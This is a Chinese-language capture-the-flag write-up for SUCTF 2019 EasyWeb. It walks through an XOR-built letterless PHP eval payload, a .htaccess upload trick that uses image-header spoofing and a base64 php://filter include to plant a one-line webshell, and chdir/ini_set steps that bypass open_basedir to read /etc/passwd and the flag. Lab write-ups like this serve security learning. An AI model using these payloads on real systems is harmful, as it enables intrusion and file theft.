## [SUCTF 2019]EasyWeb

这一题挺不错的

进去后获得源码：

```php
<?php
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    if(!file_exists($userdir)){
    mkdir($userdir);
    }
    if(!empty($_FILES["file"])){
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name,".")+1);
    if(preg_match("/ph/i",$extension)) die("^_^"); 
        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
    if(!exif_imagetype($tmp_name)) die("^_^"); 
        $path= $userdir."/".$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}

$hhh = @$_GET['_'];

if (!$hhh){
    highlight_file(__FILE__);
}

if(strlen($hhh)>18){
    die('One inch long, one inch strong!');
}

if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
    die('Try something else!');

$character_type = count_chars($hhh, 3);
if(strlen($character_type)>12) die("Almost there!");

eval($hhh);
?>
```

仔细观察一下正则：

```php
if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
    die('Try something else!');
$character_type = count_chars($hhh, 3);
if(strlen($character_type)>12) die("Almost there!");
eval($hhh);
```

一看就知道是无字母数字webshell，我们可以用取反、异或、自增、或、与进行构造

但是这里过滤了 ~ | &  ，所以只有自增和异或了，但是自增会导致过长，所以采取**异或**

我们先写一个脚本来看看可以使用哪些字符：

```php
# 获取可以使用哪些字符

for($i=0;$i<256;$i++) {
    $c = chr($i);
    if(!preg_match('/[\x00- 0-9A-Za-z\'"`~_&.,|=[\x7F]+/i',$c)) {
            echo $c.":  ".urlencode($i)."  +  ".urlencode($j).PHP_EOL;
        }
}

输出：
   !#$%()*+-/:;<>?@\]^{}
```

可见，我们可以使用 `$ { } ; ^` 并且根据字符数限制，我们可以联想到使用GET传参的方式：`$_GET[1]`

但是这里中括号 `[`被过滤了，我们可以使用 `{}` 代替：`$_GET{1} = $_GET[1]`

但是这些字符都使用不了怎么办？

我们需要使用 `^` 进行异或构造：

```php
$arr = ['_','G','E','T'];
$s = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_";
for($i=0;$i<256;$i++) {
    for($j=0;$j<256;$j++) {
        $c=chr($i^$j);
        if(in_array($c,$arr)&&strpos($s,chr($i))==false&&strpos($s,chr($j))==false) {
            echo $c." : ".urlencode(chr($i))."  +  ".urlencode(chr($j)).PHP_EOL;
        }
    }
}
```

输出有很多，但是由于这里有字符种类的限制，所以我们尽量使用有一个异或值是一样的：

```
_ : %FE  +  %A1
T : %FE  +  %AA
G : %FE  +  %B9
E : %FE  +  %BB
_ : %FF  +  %A0
T : %FF  +  %AB
G : %FF  +  %B8
E : %FF  +  %BA
```

（这里需要知道，**url编码后为`%FF`的值与其他值进行异或的话，其实是将该值取反**，因为其二进制值为全1）

于是我们可以将这些值拼接起来，调用`get_the_flag`函数：

`${%FE%FE%FE%FE^%A1%B9%BB%AA}{%FE}();`

```php
_=${%FE%FE%FE%FE^%A1%B9%BB%AA}{%FE}();&&%FE=get_the_flag
```



我们调用一下`phpinfo`，发现 `disable_function`禁用了很多函数，

并且`open_basedir`限制为：`/tmp:/var/www/html` 其中 `:` 的意思是**或**，

只能在 `/tmp` 和 `/var/www/html`目录访问

![image-20230516132439770](https://s2.loli.net/2023/05/16/w3xKJOmaViH1ZnY.png)



然后我们仔细分析一下：`get_the_flag()`

```php
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    if(!file_exists($userdir)){
    mkdir($userdir);
    }
    if(!empty($_FILES["file"])){
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name,".")+1);
    if(preg_match("/ph/i",$extension)) die("^_^"); 
        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
    if(!exif_imagetype($tmp_name)) die("^_^"); 
        $path= $userdir."/".$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}
```

这是一个文件上传的功能，我们必须先调用这个函数，然后再上传才有效

分析一下，文件不能以：`ph`结尾，并且文件的内容不能包含 `<?`

![image-20230516132908243](https://s2.loli.net/2023/05/16/Dca9hj1vxWZN3OT.png)

如果php版本老的话，可以使用 `<script language='php'></script>` 绕过，但是这里php7.2

![image-20230516133112288](https://s2.loli.net/2023/05/16/RbUF2vYZ9GaJdeC.png)



这里是apache服务器，可以上传 `.htaccess`文件

之前只知道`.htaccess`文件`AddType`的作用，可以将指定类型的文件解析为php，

这里还学到一个东西：（`.user.ini`中也有）

![image-20230516133357301](https://s2.loli.net/2023/05/16/l95384xVYhBwpmL.png)

```php
php_value auto_append_file hacker.cc   # 将解析为php执行的文件后面添加 hacker.cc文件的内容
```

但是我们不能直接上传上去，因为存在：`exif_imagetype()`函数进行检测是否为图片。

这里可以有两种绕过方法：

##### **XBM图片**

`.htaccess`文件中可以用  `#`作为注释符

![image-20230516133902118](https://s2.loli.net/2023/05/16/Uv4PZVAGtF27zMQ.png)

当我们添加：

```
#define width 1337
#define height 1337
```

那么可以绕过`exif_imagetype()`函数，并且由于加上了#，对 `.htaccess`文件不会造成影响



##### WBMP图片

我们可以在文件头加上：`\x00\x00\x85\x85` 需要使用16进制编辑器(必须加在文件头)

![image-20230516134443001](https://s2.loli.net/2023/05/16/ta87QXsr3Ekdf1O.png)





根据以上分析，我们有这么一个思路，由于我们不能上传php文件，内容不能包含 `<?`

所以我们可以将文件内容先base64编码，

文件头加上 `\x00\x00\x85\x85` 绕过

然后在`.htaccess` 中 `php_value auto_append_file `使用伪协议解码，将一句话木马包含进来，

（注意，我们要先把木马文件解析为php文件，这样才能让`auto_append_file`包含进木马文件中)

![image-20230516134750382](https://s2.loli.net/2023/05/16/ZWhtimIFP9rvl2u.png)





所以，我们构造上传html:（注意调用get_the_flag函数）

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    
    <form action="http://87575331-e8e9-433c-9488-7bb3938a1c0b.node4.buuoj.cn:81/?_=${%FE%FE%FE%FE^%A1%B9%BB%AA}{%FE}();&&%FE=get_the_flag" method="post" enctype="multipart/form-data">
        <input type="file" name="file">file
        <input type="submit">submit
    </form>

</body>
</html>
```

 `hacker.cc`内容：

![image-20230516135259876](https://s2.loli.net/2023/05/16/VjeOyFmDJAdgbxo.png)

后面添加`12`是因为：

![image-20230516135403006](https://s2.loli.net/2023/05/16/yjTPVLKcflh4Ads.png)

我们需要将字符凑为4的整数倍

![image-20230516135224270](https://s2.loli.net/2023/05/16/HZmFyClzRrDdtEX.png)

base64的值是一句话木马



上传：

![image-20230516135453109](https://s2.loli.net/2023/05/16/Dhy481RgZbNuOw9.png)

获得文件路径



`.htaccess`内容：

```
#define width 1337
#define height 1337
AddType application/x-httpd-php .cc
php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_f9e1016a5cec370aae6a18d438dabfa5/hacker.cc"
```

（将cc结尾文件解析为php执行，然后使用伪协议base64解码，包含进cc文件中）

上传：

![image-20230516135627978](https://s2.loli.net/2023/05/16/ZkznGgMlJqyKPme.png)

然后我们直接蚁剑连接，但是由于 `open_basedir `、`disable_function`没有权限，所以无法读flag

所以我们需要**绕过 open_basedir**

 

法一：使用蚁剑插件：

![image-20230516140125308](https://s2.loli.net/2023/05/16/mra5JE2I4jRQxqS.png)



法二：

这里我们使用手工绕过

[open_basedir绕过](https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/)

[bypass open_basedir的新方法](https://xz.aliyun.com/t/4720)

[从PHP底层看open_basedir bypass](https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#%E6%80%BB%E7%BB%93)

```php
<?php
mkdir('Von');  //创建一个目录Von
chdir('Von');  //切换到Von目录下
ini_set('open_basedir','..');  //把open_basedir切换到上层目录
chdir('..');  //以下这三步是把目录切换到根目录
chdir('..');
chdir('..');
ini_set('open_basedir','/');  //设置open_basedir为根目录(此时相当于没有设置open_basedir)
echo file_get_contents('/etc/passwd');  //读取/etc/passwd
```

![image-20230516140823090](https://s2.loli.net/2023/05/16/i5pOCdFEmaIberf.png)

因此，我们可以使用没有禁用的函数，print_r、file_get_contents

![image-20230516140943513](https://s2.loli.net/2023/05/16/pFaKR79hYIcbk5Z.png)



```php
?1=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/'));
```

找到根目录下：`THis_Is_tHe_F14g` 文件

读取：

```php
?1=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(file_get_contents('/THis_Is_tHe_F14g'));
```













